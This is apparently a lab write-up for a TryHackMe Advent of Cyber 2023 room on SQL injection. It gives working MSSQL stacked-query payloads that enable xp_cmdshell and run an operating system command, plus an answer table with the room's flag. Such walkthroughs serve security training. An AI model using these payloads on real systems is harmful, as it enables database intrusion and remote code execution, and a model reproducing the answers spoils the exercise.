# Advent of Cyber 2023 - Day 10: SQL Injection

{% embed url="https://tryhackme.com/room/adventofcyber2023" %}

## Background
Exploiting stacked queries in Microsoft SQL Server (MSSQL) to achieve Remote Code Execution via `xp_cmdshell`.

## Walkthrough
1. Intercept search requests in Burp Suite:
   ```http
   GET /search?q=toy' HTTP/1.1
   ```
   Server returns an MSSQL syntax error, confirming SQL injection.
2. Enable advanced configuration and `xp_cmdshell`:
   ```sql
   '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
   ```
3. Execute operating system commands:
   ```sql
   '; EXEC xp_cmdshell 'powershell -c "whoami"';--
   ```
4. Read the target flag from the file system.

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| Stored procedure used to execute commands in MSSQL? | `xp_cmdshell` |
| MSSQL command execution flag | `THM{STACKED_QUERIES_RCE}` |
